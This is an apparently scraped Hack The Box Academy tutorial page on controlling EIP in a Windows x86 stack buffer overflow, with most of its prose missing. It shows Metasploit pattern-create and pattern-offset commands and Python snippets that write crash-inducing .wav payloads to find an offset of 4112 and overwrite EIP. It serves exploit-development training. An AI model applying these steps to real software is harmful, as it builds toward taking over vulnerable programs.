<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/89/section/946
// Platform Version: V1
// Module ID: 89
// Module Name: Stack-Based Buffer Overflows on Windows x86
// Module Difficulty: Medium
// Section ID: 946
// Section Title: Controlling EIP
// Page Title: Hack The Box - Academy
// Page Number: 04
-->

# Controlling EIP

**Module Name:** Stack-Based Buffer Overflows on Windows x86 **Page Number:** 04

#### 

#### STACK-BASED BUFFER OVERFLOWS ON WINDOWS X86

# Controlling EIP

## EIP Offset

## Creating Unique Pattern

``` shell-session
[!bash!]$ /usr/bin/msf-pattern_create -l 5000

Aa0Aa1Aa2...SNIP...3Gk4Gk5Gk
```

``` cmd-session
--Pattern
Generates a non repeating pattern. A pattern of pure ASCII characters can be generated up to 20277 and up to  
66923 if special characters are used. The offset of a particular string can be found inside the pattern by 
providing a search string (must be at least 3 chars long).
    Pattern create: ERC --pattern <create | c> <length>
    Pattern offset: ERC --pattern <offset | o> <search string>
```

![https://academy.hackthebox.com/storage/modules/89/win32bof_erc_pattern_create_1.jpg](https://academy.hackthebox.com/storage/modules/89/win32bof_erc_pattern_create_1.jpg)

## Writing Our Exploit

``` python
def eip_offset():
    payload = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac"
                    ...SNIP...
                    "Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk",
					"utf-8")
```

``` python
with open('pattern.wav', 'wb') as f:
        f.write(payload)
```

``` python3
eip_offset()
```

![https://academy.hackthebox.com/storage/modules/89/win32bof_python_idle_exploit_2.jpg](https://academy.hackthebox.com/storage/modules/89/win32bof_python_idle_exploit_2.jpg)

## Calculating EIP Offset

![https://academy.hackthebox.com/storage/modules/89/win32bof_x32dbg_restart.jpg](https://academy.hackthebox.com/storage/modules/89/win32bof_x32dbg_restart.jpg)

![https://academy.hackthebox.com/storage/modules/89/win32bof_pattern_eip.jpg](https://academy.hackthebox.com/storage/modules/89/win32bof_pattern_eip.jpg)

``` shell-session
[!bash!]$ /usr/bin/msf-pattern_offset -q 31684630

[*] Exact match at offset 4112
```

![https://academy.hackthebox.com/storage/modules/89/win32bof_pattern_eip_ascii.jpg](https://academy.hackthebox.com/storage/modules/89/win32bof_pattern_eip_ascii.jpg)

![https://academy.hackthebox.com/storage/modules/89/win32bof_pattern_offset.jpg](https://academy.hackthebox.com/storage/modules/89/win32bof_pattern_offset.jpg)

![https://academy.hackthebox.com/storage/modules/89/win32bof_pattern_offset_findnrp.jpg](https://academy.hackthebox.com/storage/modules/89/win32bof_pattern_offset_findnrp.jpg)

## Controlling EIP

``` python
def eip_control():
    offset = 4112
    buffer = b"A"*offset
    eip = b"B"*4
    payload = buffer + eip
    
    with open('control.wav', 'wb') as f:
        f.write(payload)

eip_control()
```

![https://academy.hackthebox.com/storage/modules/89/win32bof_control_eip.jpg](https://academy.hackthebox.com/storage/modules/89/win32bof_control_eip.jpg)

# 

# 

#### Questions

####